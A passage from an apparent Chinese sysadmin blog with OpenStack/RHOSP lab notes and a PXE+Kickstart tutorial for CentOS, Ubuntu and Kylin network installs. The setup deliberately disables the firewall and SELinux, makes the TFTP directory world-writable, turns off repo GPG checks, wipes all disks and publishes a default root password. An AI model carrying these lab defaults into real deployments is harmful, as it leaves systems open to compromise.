存储节点power(电源管理)：实际生产环境没有这个节点，模拟的带外管理口，IPMI协议.utility：实质是模拟IDM集成身份验证的机器（有点类似于Windows基础架构中的AD服务器的作用，实际这个在生产环境中根据需要配置）网络介绍:    调配网络(director): 172.25.249.X/24；控制各个物理机开关，如果想安装各个物理机，可以将物理机的网络连接到director，进行安装。    管理网络(Managerment)：172.24.X.0/24；多VLAN角色，细化各个角色的流量。    外部网络(External): 使用workstation登录到各个节点去做使用的网络    实例网络(): 在OpenStack虚拟机创建后分配的浮动IP地址课堂中的网络拓扑：    openstack service api: Internal API (Vlan 10)    租户网络: Tenant (vlan 20)    存储数据网络: Storage (vlan 30)    存储管理网络: Storage Mgmt (vlan 40)    管理网络：Management (vlan 50)classroom服务器：充当时间同步服务器使用    在openstack中，一定要加载时间同步服务器，一定要保证各个节点的时间0误差，因为会涉及到keystone认证时间戳问题。身份认证服务器(IDM): IPMI协议 623端口；root@power，执行 netstat -uln | grep 623    随时对设备进行上电和下单的处理-模拟带外管理口</code></pre><h2 id="OpenStack介绍"><a href="#OpenStack介绍" class="headerlink" title="OpenStack介绍"></a>OpenStack介绍</h2><pre><code class="hljs bash"><span class="hljs-comment"># 什么是OpenStack</span>    开源的云计算管理平台项目    官网(原生平台): https://www.openstack.org/    官方文档: https://docs.openstack.org/    发行列表: https://releases.openstack.org/    提供一个企业级云环境    NASA和Rackspace合作研发    最终目的是为了构建和管理企业的公有云、私有云、混合云环境    注意：OpenStack是云管平台，不是虚拟化平台，OpenStack创建虚拟机底层使用的是KVM<span class="hljs-comment"># RHOSP</span>    Red Hat OpenStack Platform    提供企业级OpenStack发行版    优点：        针对企业环境优化，如果有漏洞，有重大问题—&gt;可以打补丁来保证平台的稳定性        可以和容器podman、OpenShift、RHEL Linux、红帽卫星去集成等        与各个服务器、软件服务商、云服务商达成战略合作并形成生态圈    国内：华为HCS、阿里飞天等<span class="hljs-comment"># 描述UnderCloud</span>    介绍UnderCloud        是在RHOSP平台的Director的节点上单独安装的All <span class="hljs-keyword">in</span> One的Openstack        原生的Openstack的All <span class="hljs-keyword">in</span> one：            https://www.rdoproject.org/install/packstack            相当于吧OpenStack中所有的东西部署在一个节点上，仅能测试，不建议生产使用        想构建UnderCloud需要哪些功能？            身份服务: ketstone, 提供UnderCloud组件用户身份认证和授权            镜像服务: glance, 存储在裸机上安装操作系统和KVM已经各种需要的软件 (针对于不是Openstack裸机镜像)            技术服务: nova, 根据glance提供的镜像，配合IPMI来安装虚拟机和物理机            编排服务: heat，一组yaml魔板，根据定义好的代码来配置合适的OverCloud节点            对象存储服务: swift, 用于存储undercloud的用户镜像和日志            网络服务: 提供undercloud的调配网络访问，在调配网络中</code></pre><h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><pre><code class="hljs bash"></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PXE+Kickstart</title>
      <link href="/2025/04/04/PXE-Kickstart/"/>
      <url>/2025/04/04/PXE-Kickstart/</url>
      
        <content type="html"><![CDATA[<h2 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1 环境配置"></a>1 环境配置</h2><h3 id="1-1-PXE服务器端初始化"><a href="#1-1-PXE服务器端初始化" class="headerlink" title="1.1 PXE服务器端初始化"></a>1.1 PXE服务器端初始化</h3><blockquote><p>Centos7.9最小安装后初始化</p></blockquote><p>关闭防火墙&#x2F;SELinux&#x2F;配置yum源&#x2F;安装常用软件&#x2F;关闭sshd服务器的DNS</p><pre><code class="hljs bash">systemctl <span class="hljs-built_in">disable</span> --now firewalldsystemctl <span class="hljs-built_in">disable</span> --now postfixsed -i.bak <span class="hljs-string">&#x27;/^SELINUX=/c SELINUX=disabled/&#x27;</span> /etc/selinux/configsetenforce 0<span class="hljs-built_in">cd</span> /etc/yum.repos.d/ <span class="hljs-built_in">mkdir</span> bak <span class="hljs-built_in">mv</span> CentOS-* bak/ curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.tencent.com/repo/centos7_base.repocurl -o /etc/yum.repos.d/epel.repo http://mirrors.tencent.com/repo/epel-7.repoyum install -y tree wget lrzsz vim gdisk lsof net-tools bash-completion autofs yum-utils rsync unzip<span class="hljs-comment"># vim /etc/profile.d/prompt.sh</span>PS1=<span class="hljs-string">&quot;\[\e[1;33m\][\u@\h \W]\[\e[0m\]\\$ &quot;</span> <span class="hljs-built_in">alias</span> cgrep=<span class="hljs-string">&quot;egrep -v &#x27;^(#|$)&#x27;&quot;</span> <span class="hljs-built_in">alias</span> nt=<span class="hljs-string">&#x27;netstat -tnlp&#x27;</span> <span class="hljs-built_in">alias</span> ntu=<span class="hljs-string">&#x27;netstat -tnlpu&#x27;</span> <span class="hljs-built_in">alias</span> cdnet=<span class="hljs-string">&#x27;cd /etc/sysconfig/network-scripts/&#x27;</span><span class="hljs-comment"># vi /etc/ssh/sshd_config # UseDNS no</span><span class="hljs-comment"># 制作快照 shutdown -h now</span></code></pre><hr><h3 id="1-2-安装和配置TFTP服务"><a href="#1-2-安装和配置TFTP服务" class="headerlink" title="1.2 安装和配置TFTP服务"></a>1.2 安装和配置TFTP服务</h3><blockquote><p>安装tftp和xinetd</p></blockquote><pre><code class="hljs bash">yum install -y tftp-server.x86_64 xinetdrpm -ql tftp-serversystemctl <span class="hljs-built_in">enable</span> --now tftpsystemctl <span class="hljs-built_in">enable</span> --now xinetdnetstat -tnlpu | grep 69</code></pre><blockquote><p>修改配置文件</p></blockquote><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /var/lib/tftpboot/grub<span class="hljs-built_in">mkdir</span> /var/lib/tftpboot/kernel<span class="hljs-built_in">chmod</span> -R 757  /var/lib/tftpboot/sed -i.bak <span class="hljs-string">&#x27;/args/s/$/ -c/&#x27;</span> /etc/xinetd.d/tftpsed -i <span class="hljs-string">&#x27;14s#yes#no#&#x27;</span> /etc/xinetd.d/tftpsystemctl restart xinetd</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915113233791.png" alt="img"></p><h3 id="1-3-安装和配置DHCP服务"><a href="#1-3-安装和配置DHCP服务" class="headerlink" title="1.3 安装和配置DHCP服务"></a>1.3 安装和配置DHCP服务</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装DHCP</span>yum install -y dhcp<span class="hljs-comment"># 拷贝dhcpd.conf模版文件</span><span class="hljs-built_in">cat</span> /etc/dhcp/dhcpd.conf<span class="hljs-built_in">cp</span> /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf<span class="hljs-comment"># 编辑dhcpd配置文件：vi /etc/dhcp/dhcpd.conf。其他配置可以删除</span>option domain-name <span class="hljs-string">&quot;baidu.com&quot;</span>;option domain-name-servers 180.76.76.76、opt,119.29.29.29,223.5.5.5;log-facility local7; <span class="hljs-comment"># 这行配置下</span>next-server 192.168.14.5;filename <span class="hljs-string">&quot;/grub/bootx64.efi&quot;</span>;subnet 192.168.14.0 netmask 255.255.255.0 &#123;  range 192.168.14.100 192.168.14.200;  option routers 192.168.14.1;  filename <span class="hljs-string">&quot;/grub/grubx64.efi&quot;</span>;&#125;host tftp &#123;  hardware ethernet 00:0c:29:9d:f7:50;  fixed-address 192.168.35.5;&#125;<span class="hljs-comment">#end</span>systemctl <span class="hljs-built_in">enable</span> --now dhcpd<span class="hljs-comment"># 查看日志</span><span class="hljs-built_in">tail</span> -f /var/log/messages<span class="hljs-comment"># DHCP数据库文件</span><span class="hljs-built_in">cat</span> /var/lib/dhcpd/dhcpd.leases</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915111202236.png" alt="img"></p><h3 id="1-4-安装和配置HTTP服务"><a href="#1-4-安装和配置HTTP服务" class="headerlink" title="1.4 安装和配置HTTP服务"></a>1.4 安装和配置HTTP服务</h3><pre><code class="hljs bash">yum install -y httpdsystemctl <span class="hljs-built_in">enable</span> --now httpdsed -i.bak <span class="hljs-string">&#x27;/#ServerName/aServerName localhost:80&#x27;</span> /etc/httpd/conf/httpd.confsystemctl restart httpdsystemctl status httpd -l<span class="hljs-comment"># 创建相关目录</span><span class="hljs-built_in">mkdir</span> -p /var/www/html/iso/src<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/disk<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/Other<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/project<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/r<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/u<span class="hljs-built_in">mkdir</span> -p /var/www/html/src</code></pre><h3 id="1-5-Client需要启动的文件"><a href="#1-5-Client需要启动的文件" class="headerlink" title="1.5 Client需要启动的文件"></a>1.5 Client需要启动的文件</h3><blockquote><p>Ubuntu2204系统样例</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment">##  实现UEFI SecureBoot的bootx64.efi；启动引导文件grubx64.efi；菜单文件grub.cfg</span>apt-get download grub-efi-amd64-signed<span class="hljs-built_in">mkdir</span> grubdpkg -x grub-efi-amd64-signed_1.187.6xxxxx_amd64.deb grub<span class="hljs-comment"># 下载 grubnetx64.efi.signed 文件到pxe的/var/lib/tftpboot/grub/grubx64.efi</span><span class="hljs-comment"># grub/usr/lib/grub/x86_64-efi-signed/grubnetx64.efi.signed </span>scp grub/usr/lib/grub/x86_64-efi-signed/grubnetx64.efi.signed  root@192.168.35.5:/var/lib/tftpboot/grub/grubx64.efi<span class="hljs-comment">## Ubuntu2204系统下载shim.signed(UEFI SecureBoot的bootx64.efi)文件</span>apt-get download shim.signed<span class="hljs-built_in">mkdir</span> shimdpkg -x shim-signed_1.51.4+15.8-0ubuntu1_amd64.deb shim<span class="hljs-comment"># 将shim/usr/lib/shim/shimx64.efi.signed.latest文件拷贝到pxe的/var/lib/tftpboot/grub/bootx64.efi</span>scp shim/usr/lib/shim/shimx64.efi.signed.lateslst root@192.168.35.5:/var/lib/tftpboot/grub/bootx64.efi<span class="hljs-comment">## Ubuntu2204镜像找到/boot/grub/grub.cfg文件</span><span class="hljs-comment">#传到PXE /var/lib/tftpboot/grub目录中</span></code></pre><hr><h3 id="1-6-grub启动菜单的美化"><a href="#1-6-grub启动菜单的美化" class="headerlink" title="1.6 grub启动菜单的美化"></a>1.6 grub启动菜单的美化</h3><p><a href="https://hugh712.gitbooks.io/grub/content/configuration-parameters.html">gfxterm文档</a></p><blockquote><p>&#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;grub&#x2F;grub.cfg</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment">## 颜色</span><span class="hljs-comment"># 未选中菜单项的颜色，菜单框背景颜色</span><span class="hljs-built_in">set</span> menu_color_normal=white/cyan<span class="hljs-comment"># 突出显示的菜单项的颜色及其在菜单框中的背景</span><span class="hljs-built_in">set</span> menu_color_highlight=yellow/blue<span class="hljs-comment"># 指定菜单框外文字的前景色和背景色</span><span class="hljs-built_in">set</span> color_normal=yellow/black<span class="hljs-comment">## 字体下载链接(dejavu-fonts-ttf-2.37.zip) https://dejavu-fonts.github.io/Download.html</span><span class="hljs-comment">## 准备工作</span><span class="hljs-comment"># wget https://dejavu-fonts.github.io/Download.html</span><span class="hljs-comment"># unzip dejavu-fonts-ttf-2.37.zip </span><span class="hljs-comment"># grub2-mkfont -s 23 -o dejavu-sans-mono.pf2 dejavu-fonts-ttf-2.37/ttf/DejaVuSansMono.ttf</span><span class="hljs-comment"># rm -rf dejavu-fonts-ttf-2.37*</span><span class="hljs-comment">##字体</span>loadfont /grub/dejavu-sans-mono.pf2terminal_output gfxterm<span class="hljs-comment">##grub菜单的 menuentry 说明</span>menuentry <span class="hljs-string">&quot;title&quot;</span> [--class-class ..] [--<span class="hljs-built_in">users</span>=<span class="hljs-built_in">users</span>] [--unrestricted] [--hotkey-key] [--<span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>] [arg...] &#123;<span class="hljs-built_in">command</span>; ...&#125;<span class="hljs-comment"># linux加载内核文件，initrd加载虚拟根文件；</span><span class="hljs-comment"># linux和linuxefi是一样的，initrd和initrdefi是一样的</span><span class="hljs-comment"># 内核文件/var/lib/tftpboot/kernel/&#123;Kylin&#125;</span><span class="hljs-comment"># R系列；/images/pxeboot/目录下的vmlinuz 和 initrd.img，镜像需要挂载在目录上。</span>menuentry --hotkey=c <span class="hljs-string">&quot;c  Centos7.9&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Centos7.9 Kernel...&quot;</span>        linux kernel/Centos7.9/vmlinuz inst.repo=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/iso/Centos7.9&quot;</span> inst.ks=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/Centos7.9.cfg&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Centos7.9 RamDisk...&quot;</span>        initrd kernel/Centos7.9/initrd.img&#125;<span class="hljs-comment"># U系列，/casper/目录下的vmlinuz 和 initrd.img，镜像只需要放在目录上。</span>menuentry --hotkey=u <span class="hljs-string">&quot;u  Ubuntu2204&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Ubuntu2204 Kernel...&quot;</span>linux kernel/Ubuntu2204/vmlinuz ip=dhcp url=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/iso/src/Ubuntu2204.iso&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Ubuntu2204 RamDisk...&quot;</span>        initrd kernel/Ubuntu2204/initrd.img&#125;<span class="hljs-comment"># 子菜单</span>submenu --hotkey=a <span class="hljs-string">&#x27;a  Other Version System...&#x27;</span> &#123;        <span class="hljs-built_in">set</span> IP=192.168.35.5        <span class="hljs-built_in">set</span> menu_color_normal=white/black        <span class="hljs-built_in">set</span> menu_color_highlight=yellow/black        <span class="hljs-built_in">set</span> color_normal=light-magenta/black        <span class="hljs-built_in">source</span> /grub/KylinServer.cfg        <span class="hljs-built_in">source</span> /grub/KylinDesktop.cfg&#125;<span class="hljs-comment">## 其他</span><span class="hljs-comment"># 进入系统</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$grub_platform</span>&quot;</span> = <span class="hljs-string">&quot;efi&quot;</span> ]; <span class="hljs-keyword">then</span>menuentry --hotkey=n <span class="hljs-string">&#x27;n  Boot from next volume&#x27;</span> &#123;        <span class="hljs-built_in">exit</span> 1&#125;<span class="hljs-comment"># 进入Bios设置</span>menuentry --hotkey=u <span class="hljs-string">&#x27;u  UEFI Firmware Settings&#x27;</span> &#123;        fwsetup&#125;<span class="hljs-comment"># 关机和重启</span>menuentry --hotkey=h <span class="hljs-string">&#x27;h  halt&#x27;</span> &#123; halt &#125;menuentry --hotkey=r <span class="hljs-string">&#x27;r  reboot&#x27;</span> &#123; reboot &#125;<span class="hljs-keyword">else</span>menuentry <span class="hljs-string">&#x27;Test memory&#x27;</span> &#123;        linux16 /boot/memtest86+.bin&#125;<span class="hljs-keyword">fi</span></code></pre><hr><h2 id="麒麟"><a href="#麒麟" class="headerlink" title="麒麟"></a>麒麟</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h3 id="服务器-RedHat系"><a href="#服务器-RedHat系" class="headerlink" title="服务器 (RedHat系)"></a>服务器 (RedHat系)</h3><blockquote><p>ks.confg</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment">#version=DEVEL</span><span class="hljs-comment"># Use graphical install</span>text<span class="hljs-comment">#graphical</span>%packages<span class="hljs-comment">## 带UKUI GUI的服务器</span>@^kylin-desktop-environment<span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@dns-server # DNS名称服务器，该软件包组允许您在系统上运行DNS名称服务器（BIND）。</span><span class="hljs-comment">#@file-server # 文件及存储服务器，CIFS，SMB，NFS，iSCSI，iSER及iSNS网络存储服务器。</span><span class="hljs-comment">#@ftp-server # FTP服务器，这些工具允许您在系统上运行FTP服务器。</span><span class="hljs-comment">#@gnome-apps # GNOME应用程序，一组经常使用的GNOME应用程序。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@infiniband # Infiniband支持，该软件旨在使用基于RDMA的InfiniBand，iWARP，RoCE和OPS架构来支持集群，网络连接和低延迟，高带宽存储。</span>@kysecurity-SDK <span class="hljs-comment"># 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@legacy-x # 传统X Windows系统的兼容性，用于从继承X Windows环境中迁移或者可用于该环境的兼容程序。</span><span class="hljs-comment">#@mail-server # 邮件服务器，这些软件包运行您配置IMAP或Postfix邮件服务器</span>@man-help <span class="hljs-comment"># Man手册，Man手册帮助系统</span><span class="hljs-comment">#@performance # 性能工具，诊断系统和程序级别性能问题的工具。</span><span class="hljs-comment">#@remote-desktop-clients # 远程桌面客户端，远程桌面软件。</span><span class="hljs-comment">#@remote-desktop-servers # 远程桌面服务端，远端桌面服务端软件。</span><span class="hljs-comment">#@remote-system-management # Linux的远程管理，Linux的远程管理界面。</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@smb-server # 文件及存储服务器，CIFS，SMB，NFS，iSCSI，iSER及iSNS网络存储服务器。</span><span class="hljs-comment">#@system-tools # 系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">#@virtualization-hypervisor # 虚拟化 Hypervisor，最小的虚拟化主机安装。</span><span class="hljs-comment">#@virtualization-tools # 虚拟化工具，用于离线虚拟映像管理的工具。</span><span class="hljs-comment">#@web-server # 基本网页服务器，这些工具运行您在系统上运行万维网服务器。</span>%end<span class="hljs-comment"># Keyboard layouts 键盘布局</span>keyboard --xlayouts=<span class="hljs-string">&#x27;cn&#x27;</span><span class="hljs-comment"># System language</span>lang zh_CN.UTF-8 --addsupport=en_US.UTF-8<span class="hljs-comment"># Network information 网络信息</span>network  --bootproto=dhcp --onboot=on --onboot=on --ipv6=auto --activate --hostname=kylin.cn<span class="hljs-comment"># Use CDROM installation mdedia</span><span class="hljs-comment">#url --url=http://192.168.35.5/iso/ks-v10-sp3-20240626-x86_64/</span><span class="hljs-comment"># Run the Setup Agent on first boot</span>firstboot --<span class="hljs-built_in">disable</span>selinux --<span class="hljs-built_in">disable</span> <span class="hljs-comment"># selinux禁用</span>firewall --<span class="hljs-built_in">disable</span> <span class="hljs-comment"># 防火墙禁用</span>reboot <span class="hljs-comment"># 部署后重启</span>eula --agreed <span class="hljs-comment"># 同意协议</span><span class="hljs-comment"># System services</span><span class="hljs-comment">#service --enable=&quot;chronyd&quot;</span>services --enabled=<span class="hljs-string">&quot;chronyd&quot;</span> --disabled=<span class="hljs-string">&quot;avahi-daemon,rpcbind,cpus,libvirtd.service,postfix.service&quot;</span><span class="hljs-comment">#ignoredisk --only-use=sda</span><span class="hljs-comment"># Partition clearing information</span><span class="hljs-comment"># clearpart --none --initlabel</span>zerombrclearpart --all --initlabel<span class="hljs-comment"># Disk partitioning information</span>%include /tmp/sda-nvme.txt<span class="hljs-comment">## 必须加上这句话，不然无法启动桌面</span>xconfig --startxonboot<span class="hljs-comment">## System timezone 系统时区</span><span class="hljs-comment"># timesource --ntp-pool=ntp1.aliyun.com</span><span class="hljs-comment">#timesource --ntp-pool=ntp.ntsc.ac.cn</span>timezone Asia/Shanghai --utc<span class="hljs-comment"># 设置Root password，明文是 Kylin@123</span><span class="hljs-comment"># python -c &#x27;import crypt,getpass;pw=getpass.getpass();print(crypt.crypt(pw) if (pw==getpass.getpass(&quot;Confirm: &quot;)) else exit())&#x27;</span>rootpw --iscrypted $6<span class="hljs-variable">$kP</span>.a8Tx6yG7O53JN<span class="hljs-variable">$cinUa46WrKnRSy1ifhpzwyd4x3DuXE7lFIs5FzduZ6gUvEX</span>/.wJRC0mWDrV15Io2IGxtkeZy0cOwjnRFmZ/pJ0<span class="hljs-comment">## 创建普通 kylin 用户, 密码明文是 Kylin@123</span>user --name=kylin --password=$6<span class="hljs-variable">$kP</span>.a8Tx6yG7O53JN<span class="hljs-variable">$cinUa46WrKnRSy1ifhpzwyd4x3DuXE7lFIs5FzduZ6gUvEX</span>/.wJRC0mWDrV15Io2IGxtkeZy0cOwjnRFmZ/pJ0 --iscrypted --gecos=<span class="hljs-string">&quot;kylin&quot;</span><span class="hljs-comment"># --groups=whell</span><span class="hljs-comment">## addon指定附加组件，常用来配置KDUMP。购买了许可，出现了内核崩溃，可以联系技术人员会付费解决该问题</span>%addon com_redhat_kdump --<span class="hljs-built_in">disable</span> --reserve-mb=<span class="hljs-string">&#x27;1024M&#x27;</span>%end<span class="hljs-comment">## 控制系统的安装界面;pwpolicy:设置密码策略</span>%anacondapwpolicy root --minlen=8 --minquality=1 --strict --nochanges --notemptypwpolicy user --minlen=8 --minquality=1 --strict --nochanges --emptyokpwpolicy luks --minlen=8 --minquality=1 --strict --nochanges --notempty%end<span class="hljs-comment">## 安装系统前检查，并生成 /tmp/sda-nvme.txt</span>%pre<span class="hljs-comment">#       %include http://192.168.14.5/ks/disk/ks-sda-nvme-standard.cfg</span>       %include http://192.168.14.5/ks/disk/ks-sda-nvme-lvm.cfg%end<span class="hljs-comment">## 安装后的操作</span>%post --interpreter=/usr/bin/bash --<span class="hljs-built_in">log</span>=/root/ks-post.log<span class="hljs-built_in">cat</span> &gt; /etc/yum.repos.d/local.repo &lt;&lt;<span class="hljs-string">EOF</span><span class="hljs-string">[local]</span><span class="hljs-string">name=local</span><span class="hljs-string">baseurl=http://192.168.14.5/iso/ks-v10-sp3-20240626-x86_64/</span><span class="hljs-string">gpgcheck=0</span><span class="hljs-string">#gpgkey=http://192.168.14.5/iso/ks-v10-sp3-20240626-x86_64/RPM-GPG-KEY</span><span class="hljs-string">#/etc/pki/rpm-ggp/RPM-GPG-KEY-kylin</span><span class="hljs-string">EOF</span>%include http://192.168.14.5/ks/Other/sub-ks-v10-sp3-20240626-x86_64-gui.ks%end</code></pre><blockquote><p>软件环境</p></blockquote><pre><code class="hljs bash"><span class="hljs-comment">## 最小安装</span><span class="hljs-comment">#@^minimal-environment</span><span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@kysecurity-SDK # 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@man-help # Man手册，Man手册帮助系统</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@standard # 标准，标准安装。</span><span class="hljs-comment">#@system-tools # 系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">## 基础设施服务器</span><span class="hljs-comment">#@^server-product-environment</span><span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@dns-server # DNS名称服务器，该软件包组允许您在系统上运行DNS名称服务器（BIND）。</span><span class="hljs-comment">#@file-server # 文件及存储服务器，CIFS，SMB，NFS，iSCSI，iSER及iSNS网络存储服务器。</span><span class="hljs-comment">#@ftp-server # FTP服务器，这些工具允许您在系统上运行FTP服务器。</span><span class="hljs-comment">#@hardware-monitoring # 硬件监控工具，一组用来监控服务器硬件的工具。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@infiniband # Infiniband支持，该软件旨在使用基于RDMA的InfiniBand，iWARP，RoCE和OPS架构来支持集群，网络连接和低延迟，高带宽存储。</span><span class="hljs-comment">#@kysecurity-SDK # 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@mail-server # 邮件服务器，这些软件包运行您配置IMAP或Postfix邮件服务器</span><span class="hljs-comment">#@man-help # Man手册，Man手册帮助系统</span><span class="hljs-comment">#@network-file-system-client # 网络文件系统客户端，启用该系统附加到网络存储。</span><span class="hljs-comment">#@performance # 性能工具，诊断系统和程序级别性能问题的工具。</span><span class="hljs-comment">#@remote-system-management # Linux的远程管理，Linux的远程管理界面。</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@smb-server # 文件及存储服务器，CIFS，SMB，NFS，iSCSI，iSER及iSNS网络存储服务器。</span><span class="hljs-comment">#@system-tools # 系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">#@virtualization-hypervisor # 虚拟化 Hypervisor，最小的虚拟化主机安装。</span><span class="hljs-comment">#@web-server  # 基本网页服务器，这些工具运行您在系统上运行万维网服务器。</span><span class="hljs-comment">## 文件及打印服务器</span><span class="hljs-comment">#@^file-print-server-environment</span><span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@directory-client # 目录客户端，用于整合到使用目录服务管理的网络的客户端。</span><span class="hljs-comment">#@hardware-monitoring # 硬件监控工具，一组用来监控服务器硬件的工具。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@java-platform # Java平台，Linux服务器和桌面平台的Java支持。</span><span class="hljs-comment">#@kysecurity-SDK # 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@large-systems # 大系统性能，用于大型系统的性能支持工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@man-help # Man手册，Man手册帮助系统</span><span class="hljs-comment">#@network-file-system-client # 网络文件系统客户端，启用该系统附加到网络存储。</span><span class="hljs-comment">#@performance # 性能工具，诊断系统和程序级别性能问题的工具。</span><span class="hljs-comment">#@remote-system-management # Linux的远程管理，Linux的远程管理界面。</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@system-tools # 系统工具，这组软件包是各类系统工具的集合，如：连接SMB共享的客户；监控网络交通的工具。</span><span class="hljs-comment">## 基本网页服务器</span><span class="hljs-comment">#@^web-server-environment</span><span class="hljs-comment">#@container-management # 容器管理，用于管理Linux容器的工具。</span><span class="hljs-comment">#@debugging # 调试工具，调试行为异常程序以及诊断性能问题的工具。</span><span class="hljs-comment">#@development # 开发工具，基本开发环境。</span><span class="hljs-comment">#@directory-client # 目录客户端，用于整合到使用目录服务管理的网络的客户端。</span><span class="hljs-comment">#@hardware-monitoring # 硬件监控工具，一组用来监控服务器硬件的工具。</span><span class="hljs-comment">#@headless-management # 无图形终端系统管理工具，用于管理无图像终端系统的工具。</span><span class="hljs-comment">#@java-platform # Java平台，Linux服务器和桌面平台的Java支持。</span><span class="hljs-comment">#@kysecurity-SDK # 安全套件SDK，安全套件SDK。</span><span class="hljs-comment">#@kysecurity-enhance # 麒麟安全增强工具，麒麟软件安全增强工具。</span><span class="hljs-comment">#@large-systems # 大系统性能，用于大型系统的性能支持工具。</span><span class="hljs-comment">#@legacy-unix # 传统UNIX兼容性。</span><span class="hljs-comment">#@man-help # Man手册，Man手册帮助系统</span><span class="hljs-comment">#@network-file-system-client # 网络文件系统客户端，启用该系统附加到网络存储。</span><span class="hljs-comment">#@performance # 性能工具，诊断系统和程序级别性能问题的工具。</span><span class="hljs-comment">#@python-web # Python Web，基于Pyhton网络应用程序支持。</span><span class="hljs-comment">#@remote-system-management # Linux的远程管理，Linux的远程管理界面。</span><span class="hljs-comment">#@scientific # 科学计数法支持</span><span class="hljs-comment">#@security-tools # 安全性工具，用于完整性和可信验证的安全性工具。</span><span class="hljs-comment">#@smart-card # 智能卡支持，支持使用智能卡验证。</span><span class="hljs-comment">#@system-tools # 